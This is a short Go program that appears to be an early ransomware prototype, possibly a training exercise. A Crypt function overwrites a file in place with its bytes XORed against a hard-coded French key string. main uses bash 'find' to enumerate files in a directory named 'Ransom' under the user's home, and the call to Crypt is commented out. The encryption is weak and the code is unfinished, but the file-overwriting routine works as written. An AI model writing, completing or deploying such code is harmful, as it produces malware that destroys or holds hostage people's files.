package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
)

var Xorstring = "salut_je_suis_la_phrase_qui_xor_cette_save_je_suis_tres_long_cest_normal_salut_les_mentor_je_suis_un_xor"

func Crypt(filename string) {
	file, _ := os.Open(filename)
	temp, _ := file.Stat()
	arr := make([]byte, temp.Size())
	file.Read(arr)
	fmt.Println(arr)
	fmt.Println(string(arr))
	var xor []byte
	for i:=0;i<len(arr);i++ {
		xor = append(xor, arr[i]^Xorstring[i%len(Xorstring)])
	}
	_ = ioutil.WriteFile(filename, xor, 0644)
}

func main() {
	//Crypt("montxt.txt")
	cmd := exec.Command("bash","-c", "find /home/$USER/Ransom")
	output, _ := cmd.CombinedOutput()
	fmt.Println(string(output))
}
